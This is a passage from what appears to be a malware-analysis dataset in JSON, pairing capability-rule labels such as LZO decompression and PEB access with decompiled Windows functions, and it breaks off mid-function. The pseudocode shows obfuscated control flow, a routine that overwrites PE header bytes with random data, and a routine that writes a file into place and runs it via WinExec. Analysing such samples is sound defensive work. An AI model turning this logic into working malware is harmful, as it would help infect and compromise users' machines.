            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403f4a) overlaps instruction at (ram,0x00403f46)\n// \n\nuint __fastcall fcn.00403e50(uint16_t *param_1, uint param_2, uint16_t *param_3)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    uint uVar3;\n    code *pcVar4;\n    char cVar5;\n    int32_t in_EAX;\n    int32_t *piVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint32_t unaff_EBX;\n    uchar *puVar12;\n    uint *unaff_ESI;\n    int32_t *unaff_EDI;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint *puVar15;\n    bool bVar16;\n    bool bVar17;\n    bool bVar18;\n    uchar uStack5;\n    \n    cVar11 = param_2 >> 8;\n    puVar12 = &stack0xfffffffc;\n    bVar16 = &stack0xfffffffc < 0x8;\n    if ((bVar16) || (!bVar16)) {\n        bVar17 = *param_3 < 0x5a4d;\n        bVar16 = *param_3 == 0x5a4d;\n        goto code_r0x00403e7a;\n    }\n    in_EAX = in_EAX + 0x7c8ecb0d + !bVar16;\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8b27e95e;\n    puVar12 = &uStack5;\n    do {\n        *(unaff_ESI + -0x7f) = *(unaff_ESI + -0x7f) | in_EAX >> 8;\n        bVar17 = *(puVar12 + 0x5a) < param_1;\n        bVar16 = *(puVar12 + 0x5a) == param_1;\n        param_3 = param_1;\ncode_r0x00403e7a:\n        if (!bVar16) {\n            return 0;\n        }\n        if ((bVar17) || (!bVar17)) {\n            bVar18 = SCARRY4(*(param_3 + 0x1e), param_3);\n            piVar6 = *(param_3 + 0x1e) + param_3;\n            bVar17 = piVar6 < 0;\n            bVar16 = piVar6 == NULL;\n            *(puVar12 + -4) = piVar6;\n            if (!bVar16 && bVar18 == bVar17) goto code_r0x00403eab;\n            goto code_r0x00403eb8;\n        }\n        param_1 = param_3 + -1;\n    } while (param_1 != NULL && bVar16);\n    uVar3 = *unaff_ESI;\n    *unaff_EDI = unaff_ESI + 1;\n    piVar6 = *0x9750e2b5;\n    cVar11 = uVar3 >> 0x27;\n    cVar5 = *0x9750e2b5;\n    bVar18 = SBORROW1(cVar5, '\\x03');\n    bVar17 = cVar5 + -3 < '\\0';\n    bVar16 = cVar5 == '\\x03';\n    puVar2 = param_3 + 0x107efc45;\n    *puVar2 = *puVar2 >> 6 | *puVar2 << 0x1a;\ncode_r0x00403eab:\n    if (bVar16 || bVar18 != bVar17) {\n        if (param_3 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\ncode_r0x00403eb8:\n    if (*piVar6 != 0x4550) {\n        return 0;\n    }\n    if (*(*(puVar12 + -4) + 0x58) != 0) {\n        return 0;\n    }\n    *(puVar12 + -4) = 0x40;\n    puVar7 = *(puVar12 + 8);\n    uVar13 = *(puVar7 + 0x3c);\n    if (*(puVar7 + 0x3c) < 0x81) {\n        return 0;\n    }\n    if ((uVar13 < 0x81) || (0x80 < uVar13)) {\n        puVar7 = *(puVar7 + 0x3c);\n        if (0xbf < puVar7) goto code_r0x00403f5a;\n    }\n    else {\n        *puVar7 = *puVar7;\n        pcVar1 = ((unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff) + 6;\n        *pcVar1 = *pcVar1 + cVar11;\n    }\n    *(puVar12 + -4) = puVar7 + -0x80;\ncode_r0x00403f5a:\n    puVar8 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(*(puVar12 + -4));\n    pcVar4 = _sym.imp.MSVCRT.dll_rand;\n    *(puVar12 + -8) = puVar8;\n    if (puVar8 != NULL) {\n        uVar13 = 0;\n        if (*(puVar12 + -4) != 0) {\n            do {\n                iVar9 = (*pcVar4)();\n                uVar10 = *(puVar12 + -4);\n                uVar14 = uVar13 + 1;\n                *(uVar13 + puVar8) = iVar9 % 0xff;\n                uVar13 = uVar14;\n            } while (uVar14 < uVar10);\n        }\n        uVar13 = *(puVar12 + -4);\n        puVar15 = *(puVar12 + 8) + 0x80;\n        for (uVar10 = uVar13 >> 2; uVar10 != 0; uVar10 = uVar10 - 1) {\n            *puVar15 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar15 = puVar15 + 1;\n        }\n        for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n            *puVar15 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar15 = puVar15 + 1;\n        }\n        sub.MSVCRT.dll_void___cdecl_operator_delete_void__(*(puVar12 + -8));\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1593
    },
    "00404b10": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404b10(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x423660 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004040d0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x411480, acStack1304, &uStack2112);\n    uStack2088 = 0x411508;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x411520;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004024c0(auStack1564, 0x41147c, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1865
    },
    "00401880": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401bf1) overlaps instruction at (ram,0x00401bee)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00401880(void)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    ushort uVar8;\n    uint32_t uVar6;\n    char *pcVar7;\n    ushort extraout_CX;\n    int32_t extraout_ECX;\n    int32_t *extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    int32_t extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint extraout_ECX_08;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    int32_t extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint extraout_EDX_02;\n    ushort uVar9;\n    uint16_t uVar10;\n    uint32_t unaff_EBX;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    uchar *puVar14;\n    uint32_t *puVar15;\n    uint32_t *puVar16;\n    uint *unaff_EBP;\n    ushort uVar17;\n    uint *unaff_ESI;\n    uint uVar18;\n    uint uVar19;\n    uint16_t uVar20;\n    uint *unaff_EDI;\n    uint32_t uVar21;\n    uint uVar22;\n    uint16_t in_SS;\n    uint8_t in_CF;\n    bool bVar23;\n    uint8_t in_AF;\n    uchar in_ZF;\n    uchar uVar24;\n    bool bVar25;\n    uchar in_SF;\n    char cVar26;\n    char cVar27;\n    char cVar28;\n    char cVar29;\n    unkbyte10 extraout_ST0;\n    ulong uVar30;\n    uint32_t uStack68;\n    uint uStack48;\n    uint32_t auStack44 [4];\n    uint uStack28;\n    \n    uStack28 = 0x411194;\n    auStack44[3] = 0x4018a8;\n    iVar4 = fcn.00402610();\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        in_CF = 0;\n        in_SF = iVar4 < 0;\n    }\n    auStack44[3] = 0x12;\n    auStack44[2] = 0x4111cc;\n    auStack44[1] = 0x15;\n    auStack44[0] = 0x411194;\n    uStack48 = 0x4018c9;\n    uVar30 = fcn.00402610();\n    if ((in_SF) || (!in_SF)) {\n        uStack48 = 4;\n        iVar4 = extraout_ECX;\ncode_r0x004018e3:\n        pcVar7 = (uVar30 >> 0x20) + 0x15;\n        *pcVar7 = *pcVar7 + (iVar4 + 1 >> 8);\n        fcn.00402610();\n    }\n    else {\n        iVar4 = extraout_ECX + -1;\n        if (iVar4 == 0 || uVar30 + 0x68046a2f + in_CF == 0) goto code_r0x004018e3;\n    }\n    uStack28 = 0x411194;\n    auStack44[3] = 0x40190c;\n    fcn.00402610();\n    bVar23 = (POPCOUNT(extraout_DX + (extraout_DX >> 8)) & 1U) == 0;\n    uStack28 = 0x411194;\n    auStack44[3] = 0x40192a;\n    uVar30 = fcn.00402610();\n    pcVar7 = uVar30 >> 0x20;\n    iVar4 = uVar30;\n    if ((bVar23) || (auStack44[3] = auStack44[3] & 0xffff | unaff_ESI << 0x10,  !bVar23)) {\n        auStack44[3] = 0xb;\n        auStack44[2] = 0x4111f8;\n    }\n    else {\n        out(*unaff_ESI, uVar30 >> 0x20);\n        do {\n            cVar26 = iVar4 >> 8;\n            in_AF = 9 < (iVar4 & 0xf) | in_AF;\n            iVar4 = CONCAT31(CONCAT21(iVar4 >> 0x10, cVar26 - in_AF), -in_AF);\n        } while (in_AF || cVar26 == *pcVar7);\n        piVar1 = unaff_EDI + pcVar7 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX_00 + 0x6a) = iVar4;\n        unaff_EBP = unaff_EBP | *(iVar4 + -8);\n        *extraout_ECX_00 = *extraout_ECX_00 + iVar4;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    auStack44[1] = 0x15;\n    auStack44[0] = 0x411194;\n    uStack48 = 0x401954;\n    fcn.00402610();\n    bVar23 = false;\n    uStack28 = 0x411194;\n    auStack44[3] = 0x40197e;\n    fcn.00402610();\n    if ((bVar23) || (!bVar23)) {\n        auStack44[3] = 8;\n        auStack44[2] = 0x411210;\n    }\n    else {\n        *unaff_EDI = *unaff_ESI;\n        auStack44[3] = extraout_ECX_01;\n    }\n    auStack44[1] = 0x15;\n    auStack44[0] = 0x411194;\n    uStack48 = 0x40199f;\n    fcn.00402610();\n    uStack48 = 0xd;\n    fcn.00402610();\n    uStack68 = uStack68 & 0xffff0000 | in_SS;\n    uVar30 = fcn.00402610();\n    puVar16 = uVar30 >> 0x20;\n    *(uVar30 + -0x7ce92414) = extraout_ST0;\n    in_AF = 9 < (uVar30 - 1U & 0xf) | in_AF;\n    *puVar16 = *puVar16 + 0x256adf84;\n    bVar23 = (POPCOUNT(*puVar16 & 0xff) & 1U) == 0;\n    uStack28 = 0x411240;\n    auStack44[3] = 0x15;\n    auStack44[2] = 0x411194;\n    auStack44[1] = 0x401a0b;\n    fcn.00402610();\n    if ((!bVar23) && (bVar23)) {\n        puVar12 = &stack0xffffffd8;\n        cVar26 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *unaff_EBP;\n            cVar26 = cVar26 + -1;\n        } while ('\\0' < cVar26);\n        uVar5 = in(0x78);\n        return uVar5;\n    }\n    auStack44[1] = 10;\n    auStack44[0] = 0x411268;\n    uStack48 = 0x15;\n    fcn.00402610();\n    uVar6 = (unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff;\n    uStack28 = 0x411274;\n    auStack44[3] = 0x15;\n    auStack44[2] = 0x411194;\n    auStack44[1] = 0x401a68;\n    fcn.00402610();\n    uStack28 = 0x411280;\n    auStack44[3] = 0x15;\n    auStack44[2] = 0x411194;\n    auStack44[1] = 0x401a99;\n    uVar3 = fcn.00402610();\n    cVar28 = '\\0';\n    cVar26 = (uVar3 ^ unaff_EBX) < 0;\n    uStack28 = 0x411290;\n    auStack44[3] = 0x15;\n    auStack44[2] = 0x411194;\n    auStack44[1] = 0x401ab4;\n    uVar17 = 0;\n    uVar8 = 0;\n    fcn.00402610();\n    uVar11 = extraout_ECX_02;\n    if (cVar28 == cVar26) {\n        auStack44[1] = auStack44[1] & 0xffff | extraout_ECX_02 << 0x10;\n        uVar11 = extraout_ECX_02 & 0xffff;\n        cVar27 = (extraout_ECX_02 << 0x10) >> 0x18;\n        if (cVar28 != cVar26) goto code_r0x00401ac6;\n    }\n    cVar27 = uVar11 >> 8;\n    auStack44[1] = 5;\n    auStack44[0] = 0x411298;\n    uStack48 = 0x15;\ncode_r0x00401ac6:\n    uVar13 = &stack0xffffffd0 ^ *(uVar6 + 0x6a);\n    *(extraout_EDX + 0x15) = *(extraout_EDX + 0x15) + cVar27;\n    *(uVar13 - 4) = 0x411194;\n    *(uVar13 - 8) = 0x401adc;\n    fcn.00402610();\n    *(uVar13 + 0x18) = uVar6;\n    uVar11 = *(uVar13 + 0x18);\n    *(uVar13 + 0x18) = 0xd;\n    *(uVar13 + 0x14) = 0x4112a0;\n    *(uVar13 + 0x10) = 0x15;\n    *(uVar13 + 0xc) = 0x411194;\n    *(uVar13 + 8) = 0x401aff;\n    uVar5 = fcn.00402610();\n    *(uVar13 + 0x18) = uVar5;\n    *(uVar13 + 0x16) = uVar11;\n    uVar9 = *(uVar13 + 0x16);\n    *(uVar13 + 0x18) = 0x19;\n    *(uVar13 + 0x14) = 0x4112b0;\n    *(uVar13 + 0x10) = 0x15;\n    *(uVar13 + 0xc) = 0x411194;\n    *(uVar13 + 8) = 0x401b2d;\n    uVar5 = fcn.00402610();\n    *(uVar13 + 0x18) = uVar5;\n    *(uVar13 + 0x14) = uStack68;\n    *(uVar13 + 0x18) = 0xf;\n    *(uVar13 + 0x14) = 0x4112cc;\n    *(uVar13 + 0x10) = 0x15;\n    *(uVar13 + 0xc) = 0x411194;\n    *(uVar13 + 8) = 0x401b64;\n    fcn.00402610();\n    *(uVar13 + 0x18) = extraout_EDX_00;\n    *(uVar13 + 0x16) = uVar9;\n    uVar10 = *(uVar13 + 0x16);\n    *(uVar13 + 0x18) = 0xe;\n    *(uVar13 + 0x14) = 0x4112dc;\n    *(uVar13 + 0x10) = 0x15;\n    *(uVar13 + 0xc) = 0x411194;\n    *(uVar13 + 8) = 0x401b9b;\n    uVar30 = fcn.00402610();\n    *(uVar13 + 0x18) = extraout_ECX_03;\n    *(uVar13 + 0x14) = uVar30 >> 0x20;\n    iVar4 = extraout_ECX_03 - uVar30;\n    uVar3 = iVar4 & 0xff00 | iVar4 ^ iVar4 >> 8 | 0x3d00 | uVar10;\n    cVar26 = uVar3;\n    cVar28 = uVar3 >> 8;\n    cVar29 = SBORROW1(cVar28, cVar26);\n    cVar27 = cVar28 - cVar26 < '\\0';\n    uVar24 = cVar28 == cVar26;\n    *(uVar13 + 0x18) = 0xb;\n    *(uVar13 + 0x14) = 0x4112ec;\n    *(uVar13 + 0x10) = 0x15;\n    *(uVar13 + 0xc) = 0x411194;\n    *(uVar13 + 8) = 0x401bd0;\n    fcn.00402610();\n    puVar16 = uVar13 + 0xc;\n    if (!uVar24 && cVar29 == cVar27) {\n        *(uVar13 + 10) = uVar17;\n        uVar17 = *(uVar13 + 10);\n        puVar16 = uVar13 + 0xc;\n    }\n    while( true ) {\n        *(puVar16 + -4) = 0xb;\n        *(puVar16 + -8) = 0x4112f8;\n        *(puVar16 + -0xc) = 0x15;\n        puVar14 = puVar16 + -0x10;\n        *(puVar16 + -0x10) = 0x411194;\n        *(puVar16 + -0x14) = 0x401bf3;\n        uVar6 = fcn.00402610();\n        if ((uVar24) || (*(puVar16 + -0x12) = extraout_CX,  !uVar24)) {\n            puVar14 = puVar16 + -0x14;\n            *(puVar16 + -0x14) = 0xb;\n        }\n        *(puVar14 + -4) = in_SS;\n        uVar21 = *(puVar14 + -4);\n        *(puVar14 + -4) = 0x47;\n        cVar28 = '\\0';\n        cVar26 = '\\0';\n        bVar23 = (uVar6 & 0xb6a18c5) == 0;\n        *(puVar14 + -8) = 0x411304;\n        *(puVar14 + -0xc) = 0x15;\n        *(puVar14 + -0x10) = 0x411194;\n        *(puVar14 + -0x14) = 0x401c17;\n        fcn.00402610();\n        if (!bVar23 && cVar28 == cVar26) {\n            *(puVar14 + -0x12) = uVar17;\n            uVar17 = *(puVar14 + -0x12);\n        }\n        *(puVar14 + -0x14) = 10;\n        *(puVar14 + -0x18) = 0x411310;\n        *(puVar14 + -0x1c) = 0x15;\n        *(puVar14 + -0x20) = 0x411194;\n        *(puVar14 + -0x24) = 0x401c36;\n        fcn.00402610();\n        puVar15 = puVar14 + 0x20;\n        if ((SCARRY4(puVar14 + -0x20, 0x40)) || (!SCARRY4(puVar14 + -0x20, 0x40))) {\n            puVar15 = puVar14 + 0x1c;\n            *(puVar14 + 0x1c) = 0xc;\n        }\n        cVar28 = '\\0';\n        uVar6 = extraout_ECX_04 & *(extraout_ECX_04 + 0x87cb1757);\n        cVar26 = uVar6 < 0;\n        bVar23 = uVar6 == 0;\n        puVar15[-1] = 0x41131c;\n        puVar15[-2] = 0x15;\n        puVar16 = puVar15 + -3;\n        puVar15[-3] = 0x411194;\n        puVar15[-4] = 0x401c63;\n        uVar6 = fcn.00402610();\n        if ((bVar23 || cVar28 != cVar26) || (!bVar23 && cVar28 == cVar26)) break;\n        in_AF = 9 < (uVar6 & 0xf) | in_AF;\n        uVar2 = uVar6 + in_AF * '\\x06';\n        pcVar7 = uVar6 & 0xffff0000 | CONCAT11((uVar6 >> 8) + in_AF, uVar2) & 0xff0f;\n        if (extraout_ECX_05 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *pcVar7 = *pcVar7 + (uVar2 & 0xf);\n        uVar24 = *pcVar7 == '\\0';\n    }\n    puVar15[-4] = 0xe;\n    puVar15[-5] = 0x411328;\n    puVar15[-6] = 0x15;\n    puVar15[-7] = 0x411194;\n    puVar15[-8] = 0x401c88;\n    uVar9 = fcn.00402610();\n    *(puVar15 + 2) = uVar9;\n    *puVar15 = extraout_ECX_06;\n    *(puVar15 + -2) = extraout_DX_00;\n    *(puVar15 + -1) = uVar10;\n    *(puVar15 + -6) = puVar15 + 4;\n    *(puVar15 + -2) = unaff_EBP;\n    *(puVar15 + -10) = uVar17;\n    *(puVar15 + -3) = uVar21;\n    puVar15[-4] = extraout_ECX_06;\n    bVar23 = false;\n    uVar20 = *(puVar15 + -3);\n    uVar18 = CONCAT22(uVar8, *(puVar15 + -10));\n    uVar10 = *(puVar15 + -2);\n    uVar3 = *(puVar15 + -1);\n    *puVar15 = 0x11;\n    puVar15[-1] = 0x411338;\n    puVar15[-2] = 0x15;\n    puVar15[-3] = 0x411194;\n    puVar15[-4] = 0x401ca9;\n    uVar5 = fcn.00402610();\n    if (!bVar23) {\n        puVar15[-4] = uVar18;\n        uVar18 = puVar15[-4];\n        if (bVar23) {\n            out(0xbd, uVar5);\n            return uVar5;\n        }\n    }\n    puVar15[-4] = 0x13;\n    puVar15[-5] = 0x41134c;\n    puVar15[-6] = 0x15;\n    puVar15[-7] = 0x411194;\n    puVar15[-8] = 0x401cda;\n    fcn.00402610();\n    *puVar15 = (uVar11 >> 8 & 0xffff00) << 8 | uVar3;\n    bVar23 = false;\n    bVar25 = (extraout_DL & 0x66) == 0;\n    uVar5 = *puVar15;\n    *puVar15 = 0x14;\n    puVar15[-1] = 0x411360;\n    puVar15[-2] = 0x15;\n    puVar15[-3] = 0x411194;\n    puVar15[-4] = 0x401cfb;\n    fcn.00402610();\n    puVar16 = puVar15 + -3;\n    if ((!bVar23 && !bVar25) && (puVar16 = puVar15 + -3,  bVar23 || bVar25)) {\n        puVar16 = puVar15 + -2;\n    }\n    puVar16[-1] = 0x33;\n    puVar16[-2] = 0x411374;\n    puVar16[-3] = 0x15;\n    puVar16[-4] = 0x411194;\n    puVar16[-5] = 0x401d1f;\n    uVar30 = fcn.00402610();\n    puVar16[3] = uVar30;\n    puVar16[2] = extraout_ECX_07;\n    puVar16[1] = uVar30 >> 0x20;\n    *puVar16 = uVar5;\n    puVar16[-1] = puVar16 + 4;\n    puVar16[-2] = unaff_EBP & 0xffff0000 | uVar10;\n    puVar16[-3] = uVar18;\n    puVar16[-4] = uVar21 & 0xffff0000 | uVar20;\n    uVar22 = puVar16[-4];\n    uVar19 = puVar16[-3];\n    uVar18 = puVar16[-2];\n    uVar5 = *puVar16;\n    puVar16[3] = 10;\n    puVar16[2] = 0x4113a8;\n    puVar16[1] = 0x15;\n    *puVar16 = 0x411194;\n    puVar16[-1] = 0x401d41;\n    fcn.00402610();\n    puVar16[3] = uVar5;\n    uVar5 = puVar16[3];\n    puVar16[3] = 4;\n    puVar16[2] = 0x4113b4;\n    puVar16[1] = 0x15;\n    *puVar16 = 0x411194;\n    puVar16[-1] = 0x401d64;\n    fcn.00402610();\n    puVar16[3] = extraout_EDX_01;\n    puVar16[2] = uVar22;\n    uVar11 = puVar16[2];\n    puVar16[3] = 5;\n    puVar16[2] = 0x4113b8;\n    puVar16[1] = 0x15;\n    *puVar16 = 0x411194;\n    puVar16[-1] = 0x401d86;\n    fcn.00402610();\n    puVar16[3] = uVar5;\n    *(puVar16 + 10) = extraout_DX_01;\n    *(puVar16 + 2) = uVar11;\n    uVar3 = *(puVar16 + 2);\n    uVar5 = puVar16[3];\n    puVar16[3] = 6;\n    puVar16[2] = 0x4113c0;\n    puVar16[1] = 0x15;\n    *puVar16 = 0x411194;\n    puVar16[-1] = 0x401daa;\n    uVar30 = fcn.00402610();\n    puVar16[3] = uVar30;\n    puVar16[2] = extraout_ECX_08;\n    puVar16[1] = uVar30 >> 0x20;\n    *puVar16 = uVar5;\n    puVar16[-1] = puVar16 + 4;\n    puVar16[-2] = uVar18;\n    puVar16[-3] = uVar19;\n    puVar16[-4] = uVar11 & 0xffff0000 | uVar3;\n    bVar23 = false;\n    puVar16[3] = 0x2a;\n    puVar16[2] = 0x4113f4;\n    puVar16[1] = 0x15;\n    *puVar16 = 0x411194;\n    puVar16[-1] = 0x401dce;\n    fcn.00402610();\n    if ((!bVar23) && (puVar16[-1] = extraout_EDX_02,  bVar23)) {\n        uVar5 = puVar16[7];\n        **puVar16 = uVar5;\n        return uVar5;\n    }\n    puVar16[-1] = 0xb;\n    puVar16[-2] = 0x411420;\n    puVar16[-3] = 0x15;\n    puVar16[-4] = 0x411194;\n    puVar16[-5] = 0x401e01;\n    uVar5 = fcn.00402610();\n    return uVar5;\n}\n",
        "token_count": 5842
    },
    "00404da0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404da0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint *puVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    uint uStack812;\n    uint var_314h;\n    uint var_210h;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar5 = &stack0xfffffffc;\n    var_8h = 0;\n    puVar7 = &var_10bh;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    bVar8 = unaff_EBX >> 8 == -0x30;\n    fcn.00402460();\n    puVar6 = &stack0xfffffffc;\n    if ((!bVar8) && (puVar6 = &stack0xfffffffc,  bVar8)) {\n        puVar7 = &stack0xfffffcd8;\n        puVar6 = &stack0xfffffcd8;\n        cVar1 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(puVar6 + -0x10c, 0x104);\n    *(puVar6 + -4) = 0;\n    do {\n        uVar3 = fcn.00402a70();\n        arg_ch_00 = fcn.00402a70();\n        arg_ch_01 = fcn.00402a70();\n        arg_8h_00 = *(puVar6 + 0x10);\n        fcn.004040d0(arg_8h_00, uVar3);\n        uVar3 = *(puVar6 + 8);\n        fcn.004040d0(uVar3, arg_ch_00);\n        fcn.004040d0(*(puVar6 + 0xc), arg_ch_01);\n        pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n        